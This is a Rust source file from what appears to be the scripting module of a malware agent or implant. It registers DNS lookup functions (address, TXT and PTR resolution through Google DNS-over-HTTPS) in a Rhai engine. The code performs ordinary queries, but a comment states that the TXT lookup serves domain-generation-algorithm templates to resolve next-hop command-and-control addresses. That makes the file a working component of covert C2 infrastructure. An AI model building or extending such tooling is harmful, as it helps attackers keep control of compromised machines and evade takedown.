// src/agent/scripting/dns.rs
use rhai::Engine;
use std::net::ToSocketAddrs;

pub fn register(engine: &mut Engine) {

    engine.register_fn("internal_dns_resolve", |hostname: &str| -> String {
        match format!("{}:80", hostname).to_socket_addrs() {
            Ok(mut it) => it.next().map(|a| a.ip().to_string())
                           .unwrap_or_else(|| "Error: empty".into()),
            Err(e)     => format!("Error: {}", e),
        }
    });

    engine.register_fn("internal_dns_resolve_all", |hostname: &str| -> String {
        match format!("{}:80", hostname).to_socket_addrs() {
            Ok(it) => {
                let ips: Vec<String> = it.map(|a| a.ip().to_string()).collect();
                serde_json::to_string(&ips).unwrap_or("[]".into())
            }
            Err(e) => format!("Error: {}", e),
        }
    });

    // TXT record lookup via Google DNS-over-HTTPS — no extra dep needed.
    // Used by DGA templates to resolve next-hop C2 addresses from TXT records.
    engine.register_fn("internal_dns_txt", |domain: &str| -> String {
        let url = format!("https://dns.google/resolve?name={}&type=TXT", domain);
        let body: serde_json::Value = match reqwest::blocking::get(&url)
            .and_then(|r| r.json()) {
            Ok(j)  => j,
            Err(e) => return format!("Error: {}", e),
        };
        let records: Vec<String> = body["Answer"].as_array()
            .unwrap_or(&vec![])
            .iter()
            .filter(|a| a["type"].as_i64() == Some(16))
            .filter_map(|a| a["data"].as_str())
            .map(|s| s.trim_matches('"').to_string())
            .collect();
        serde_json::to_string(&records).unwrap_or("[]".into())
    });

    engine.register_fn("internal_dns_reverse", |ip: &str| -> String {
        let url = format!("https://dns.google/resolve?name={}&type=PTR", ip);
        let body: serde_json::Value = match reqwest::blocking::get(&url)
            .and_then(|r| r.json()) {
            Ok(j)  => j,
            Err(e) => return format!("Error: {}", e),
        };
        body["Answer"].as_array()
            .and_then(|a| a.first())
            .and_then(|e| e["data"].as_str())
            .map(|s| s.trim_end_matches('.').to_string())
            .unwrap_or_else(|| "No PTR record".to_string())
    });
}
